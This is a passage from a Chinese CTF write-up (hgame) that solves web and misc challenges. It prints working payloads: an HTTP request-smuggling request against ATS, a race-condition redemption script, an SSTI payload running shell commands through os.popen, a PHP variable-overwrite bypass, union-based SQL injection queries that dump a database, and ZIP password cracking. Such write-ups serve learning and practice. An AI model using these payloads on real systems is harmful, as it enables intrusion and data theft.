的部分，可以发现如下逻辑。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397285458911.c03887b367f01410d362af29a3cadc215e0ee195.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gameOverShowText: <span class="function"><span class="keyword">function</span> (<span class="params">e, t</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(e &gt; <span class="number">1999</span>)&#123;</span><br><span class="line">alert(<span class="built_in">window</span>.atob(<span class="string">&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// this.ajaxLoad(&quot;http://www.wesane.com/admin.php/Gamescore/saveGamescore&quot;, &quot;gameScore=&quot; + e + &quot;&amp;gameId=&quot; + this.gameHttpId + &quot;&amp;gameType=&quot; + t, this.scoreResult)</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;do_you_know_cocos_game?&#125;</span><br></pre></td></tr></table></figure><h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><blockquote><p>参考：<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p></blockquote><p>F12 看请求可以发现 <code>Server: ATS/7.1.2</code>，同时在 <code>.../secret</code> 页面有如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ONLY LOCALHOST(127.0.0.1) CAN ACCESS THE SECRET_DATA!</span><br><span class="line">YOUR Client-IP(Client-IP NOT FOUND IN HEADERS!) IS NOT ALLOWED!</span><br></pre></td></tr></table></figure><p>于是尝试构造请求走私，使得服务器接收到一个包含 Client-IP 的 GET 请求。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length : 445</span><br><span class="line"></span><br><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>关键在于计算好 Content-Length 的长度并在前后添加空格，使得 ATS 可以正常转发而后端服务器将其忽略后识别为两个请求。使用 BurpSuite 发送两次构造好的请求就可以得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286171995.aa9a72abfc6e87cd3217ff16f50aeff92f6eed16.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;HtTp+sMUg9l1nG^i5~r3al1y-d4nG3r0Us!&#125;</span><br></pre></td></tr></table></figure><h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>定积分计算，主要有三个路由，<code>.../api/verify</code> 负责检验答案，<code>.../api/getQuestion</code> 负责提供题目，<code>.../api/api/getStatus</code> 负责查询解出数。只需要写个脚本算出结果提交，最后再给出 session 的 cookie 即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://r4u.top:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        questionRaw = session.get(url + <span class="string">&quot;api/getQuestion&quot;</span>).content</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Parsing &#123;&#125;&quot;</span>.<span class="built_in">format</span>(questionRaw))</span><br><span class="line">        regex = <span class="string">r&quot;([-+]&#123;1&#125;)&lt;/mo&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&lt;/mn&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&quot;</span></span><br><span class="line">        matches = re.findall(regex, questionRaw.decode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line">        lowerLimit, upperLimit = (<span class="built_in">int</span>(matches[<span class="number">0</span>][<span class="number">0</span>] + matches[<span class="number">0</span>][<span class="number">1</span>]), <span class="built_in">int</span>(matches[<span class="number">0</span>][<span class="number">2</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Matching &#123;&#125; from &#123;&#125; to &#123;&#125;&quot;</span>.<span class="built_in">format</span>(matches, lowerLimit, upperLimit))</span><br><span class="line"></span><br><span class="line">        regex = <span class="string">r&quot;&lt;mn&gt;(\d&#123;1,9&#125;)&lt;/mn&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;([+-]&#123;1&#125;)&lt;/mo&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&quot;</span></span><br><span class="line">        matches = re.findall(regex, questionRaw.decode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line">        arg1, operator, arg2 = matches[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Calculate &#123;&#125; with &#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(matches, arg1, operator, arg2))</span><br><span class="line">        x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        result = <span class="string">&quot;%.2f&quot;</span> % (integrate(<span class="built_in">int</span>(arg1) * x + <span class="built_in">int</span>(arg2), (x, lowerLimit, upperLimit)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Calculated result is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line"></span><br><span class="line">        response = session.post(url + <span class="string">&quot;api/verify&quot;</span>, data=json.dumps(&#123;<span class="string">&quot;answer&quot;</span>: result&#125;), headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Verify status is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.content))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;true&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Verify correct with &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Raw data is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.content))</span><br><span class="line">        response.close()</span><br><span class="line">        status = session.get(url + <span class="string">&quot;api/getStatus&quot;</span>).content</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Status is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(status))</span><br><span class="line">        index = session.get(url).content</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Index is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Done All for you and cookie is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(session.cookies))</span><br></pre></td></tr></table></figure><p>最后看到输出结果之后，将新的 cookie 重新应用于页面，刷新后即可看到 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] Done All for you and cookie is &lt;RequestsCookieJar[&lt;Cookie session&#x3D;eyJzb2x2aW5nIjoxMDB9.YBZaeA.1FXCgOvOT6RDRijlX1RhlG6arlI for r4u.top&#x2F;&gt;]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286433864.cafdb6939be55e367ed66b6c72327e681b582724.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3very0ne_H4tes_Math&#125;</span><br></pre></td></tr></table></figure><h3 id="走私者的愤怒"><a href="#走私者的愤怒" class="headerlink" title="走私者的愤怒"></a>走私者的愤怒</h3><blockquote><p>Content-Length 的计算方法：</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286716761.7f2114e78469e470a2b380ea6d67bb020250a9a6.png"></p></blockquote><!-- ![](https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287283996.af1cb16d36e4861fdfc5fe939ae8a4a57ebd0d72.png) --><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Fe3l^tHe~4N9eR+oF_5mu9gl3r!!&#125;</span><br></pre></td></tr></table></figure><h3 id="Liki的生日礼物"><a href="#Liki的生日礼物" class="headerlink" title="Liki的生日礼物"></a>Liki的生日礼物</h3><p>进入靶机之后发现是一个兑换系统，有一个用于兑换的 API。很容易猜想到使用多线程请求去多兑换。于是写一个脚本实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;https://birthday.liki.link/API/&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RushThread</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Thread Rushed&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&quot;m&quot;</span>: <span class="string">&#x27;buy&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;amount&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = session.post(url=ENV, params=param, data=data)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="built_in">print</span>(session.cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = &#123;</span><br><span class="line">    <span class="string">&quot;m&quot;</span>: <span class="string">&#x27;login&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="number">122</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="number">12</span></span><br><span class="line">&#125;</span><br><span class="line">response = session.post(ENV, params=param, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line">event = threading.Event()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    threading.Thread(target=RushThread, args=()).start()</span><br></pre></td></tr></table></figure><p>使用三十个线程去竞争，最后可以兑换得到超额的兑换券，从而兑换到 switch。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287601915.5200e81022cc326b294603ce261ce7fc07565205.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;L0ck_1s_TH3_S0lllut!on!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h3><p>登录后可以添加 Note，试探一下可以发现 SSTI 注入点。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613403884018.0cd3efd6b4d820df67eb99a4409453493d125142.png"></p><p>稍微尝试后可以构造出如下 payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).popen(&#39;od$IFS$9-c$IFS$9&#x2F;f*&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613403938612.0f0f5f5abe79131881163ae843866819ad85e8ee.png"></p><p>整理后可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;h0w_4bou7+L3arn!ng~PythOn^Now?&#125;</span><br></pre></td></tr></table></figure><h3 id="LazyDogR4U"><a href="#LazyDogR4U" class="headerlink" title="LazyDogR4U"></a>LazyDogR4U</h3><p>访问 <a href="http://www.zip/">www.zip</a> 可以泄露出一部分源码，下载下来先大致审计一遍。User 中存在以下弱比较，可能直接登录。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$password</span>) == <span class="variable">$userList</span>[<span class="variable">$username</span>][<span class="string">&#x27;pass_md5&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lazy.php 中存在如下变量注册，可能会存在变量覆盖。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = [<span class="string">&quot;SESSION&quot;</span>, <span class="string">&quot;SEVER&quot;</span>, <span class="string">&quot;COOKIE&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接注册所有变量，这样我就能少打字力，芜湖~</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$youBadBad</span>)&#123;</span><br><span class="line">            <span class="variable">$_k</span> = str_replace(<span class="variable">$youBadBad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_k</span>); <span class="comment">//# 仅做了一次替换，这里可以直接双写绕过</span></span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;<span class="variable">$_k</span>&#125; = <span class="variable">$_v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag.php 中存在对 SESSION 中值的直接判断。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;admin将于今日获取自己忠实的flag&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;<span class="subst">$flag</span>&lt;/h3&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$submit</span> == <span class="string">&quot;getflag&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;<span class="subst">&#123;$_SESSION[&#x27;username&#x27;]&#125;</span>接近了问题的终点&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;篡位者占领了神圣的页面&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时可以尝试使用变量覆盖达成对 SESSION 中值的覆盖。因此构造出如下 payload。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f2035f880d.lazy.r4u.top/flag.php?_SESSIOSESSIONN[username]=admin</span><br></pre></td></tr></table></figure><p>此时 SESSION 中的 username 被覆盖成为 admin，从而成功得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614927165219.2df95ad8448dd57aecc64076f8aa72938baefd1e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;R4U-!s_A~l@zy_D0G&#125;</span><br></pre></td></tr></table></figure><h3 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h3><p>点击按钮可以发现如下线索，server.php 的请求头中包含了奇怪的参数。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614927402598.abe03a338b6dd2d432359de263bfa09222c24c9c.png"></p><p>尝试后可以发现 status 处存在 SQL 注入。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-2&#39;&#x2F;**&#x2F;or(2&#x3D;1)# ---&gt; 无回显</span><br><span class="line">-2&#39;&#x2F;**&#x2F;or(1)# ---&gt; HTTP 200 OK</span><br></pre></td></tr></table></figure><p>于是一把梭先构造一个联合注入 <code>-2&#39;/**/uNion/**/seLect/**/1#</code> 得到 <code>1</code> 的回显。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-2</span><span class="string">&#x27;/**/uNion/**/seLect/**/groUp_concat(schema_name)/**/frOm/**/infOrmation_schEma.schEmata# </span></span><br><span class="line"><span class="string">爆出数据库 information_schema,mysql,performance_schema,sys,week2sqli</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-2&#x27;</span><span class="comment">/**/</span><span class="keyword">uNion</span><span class="comment">/**/</span><span class="keyword">seLect</span><span class="comment">/**/</span>group_concat(tablE_nAme)<span class="comment">/**/</span><span class="keyword">frOm</span><span class="comment">/**/</span>infOrmation_schEma.tablEs<span class="comment">/**/</span><span class="keyword">whEre</span><span class="comment">/**/</span>table_schema<span class="operator">=</span>databAse()# </span><br><span class="line">爆出表 f1111111144444444444g,status</span><br><span class="line"></span><br><span class="line"><span class="number">-2</span><span class="string">&#x27;/**/uNion/**/seLect/**/group_concat(cOlumn_nAme)/**/frOm/**/infOrmation_schEma.colUmns/**/whEre/**/table_schema=databAse()# </span></span><br><span class="line"><span class="string">爆出表中的字段 ffffff14gggggg,id,status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-2&#x27;</span><span class="comment">/**/</span><span class="keyword">uNion</span><span class="comment">/**/</span><span class="keyword">seLect</span><span class="comment">/**/</span>group_concat(ffffff14gggggg)<span class="comment">/**/</span><span class="keyword">frOm</span><span class="comment">/**/</span>f1111111144444444444g# </span><br><span class="line">查出 flag</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!&#x3D;)&#125;</span><br></pre></td></tr></table></figure><p>顺手查出了 status。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP 200 OK,NETWORK ERROR,HTTP 400 Bad Request,HTTP 401 Unauthorized,HTTP 403 Forbidden,HTTP 404 Not Found,HTTP 405 Method Not Allowed,HTTP 406 Not Acceptable,HTTP 408 Request Timeout,HTTP 414 URI Too Long,HTTP 418 I&#39;m a teapot,HTTP 500 Internal Server Error,HTTP 502 Bad Gateway,HTTP 503 Service Unavailable,HTTP 504 Gateway Timeout,UNKNOWN ERROR</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>base 编码套娃，通过 <code>base64 --&gt; base32 --&gt; From Hex</code> 解码即可以得出 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287897688.c9f7249614a482f5f80ac758582ed09d4cf60d3a.png"></p><h3 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h3><p>010 editor 打开图片发现文件尾部有压缩文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288170728.8d1b95abab4fa5e5e171d03a37c8c7dc52733800.png"></p><p>分离出来后压缩包的备注处有如下提示。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password is picture ID (Up to 8 digits)</span><br></pre></td></tr></table></figure><p>根据提示使用 ARCHPR 爆破得到压缩包密码为 70415155。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288474325.cef270df89e9fe21b6e8d685e8f4c829b0be0424.png"></p><p>解压之后在 NO PASSWORD 文本文档中得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sometimes we don&#39;t need to care about password.</span><br><span class="line">Because it&#39;s too strong or null. XD</span><br><span class="line">By the way, I only use storage.</span><br></pre></td></tr></table></figure><p>查看两个压缩包中的 NO PASSWORD 的 CRC，发现是一样的。于是单独压缩一份 NO PASSWORD 然后对解压出来的 plain.zip 进行明文攻击，可以得出密码为 <code>C8uvP$DP</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288843522.154d75431f8302befbc81ff4829f7284b9e2c24a.png"></p><p>解压 plain.zip 得到 flag.zip。使用 010 editor 打开文件可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D;</span><br></pre></td></tr></table></figure><p>将其 HTML Entity 解码即可得到 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;2IP_is_Usefu1_and_Me9umi_i5_W0r1d&#125;</span><br></pre></td></tr></table></figure><h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><p>Wireshark 分析流量包，筛选 http 条目，跟踪 HTTP 流到 TCP 流 26 可见图片文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397289103836.51f782600e5994cc2d0f9b797db627dc4fa1af1b.png"></p><p>将图片提取出来使用 010 editor 打开，模板运行有 CRC Mismatch 报错，于是用脚本爆破得图片宽高 <code>hex: 0x1440 0x1000</code>。将图片宽高修正可得 